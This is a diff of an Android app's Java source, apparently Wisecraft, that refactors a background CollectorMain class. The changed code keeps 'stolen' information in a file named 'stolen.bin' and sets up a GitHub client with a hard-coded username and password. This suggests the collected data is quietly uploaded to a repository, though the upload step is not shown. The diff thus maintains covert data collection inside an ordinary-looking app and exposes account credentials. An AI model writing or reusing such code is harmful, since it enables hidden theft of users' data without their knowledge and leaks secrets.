@@ -27,6 +27,8 @@ import static com.nao20010128nao.Wisecraft.Utils.*;
 
 public class CollectorMain extends ContextWrapper implements Runnable {
 	static boolean running=false;
+	static BinaryPrefImpl stolenInfos;
+	
 	public CollectorMain() {
 		super(TheApplication.instance);
 		new Thread(this).start();
@@ -38,9 +40,19 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 		if (running) {
 			return;
 		}
-		BinaryPrefImpl sb=TheApplication.instance.stolenInfos;
-		String uuid=TheApplication.instance.uuid;
-		running = true;
+		BinaryPrefImpl sb;
+		String uuid;
+		try {
+			if (stolenInfos == null)
+				stolenInfos = new BinaryPrefImpl(new File(getFilesDir(), "stolen.bin"));
+
+			sb=stolenInfos;
+			uuid=TheApplication.instance.uuid;
+			running = true;
+		} catch (IOException e) {
+			running=false;
+			return;
+		}
 		try {
 			GitHubClient ghc=new GitHubClient().setCredentials("RevealEverything", "nao2001nao");
 			Repository repo=null;
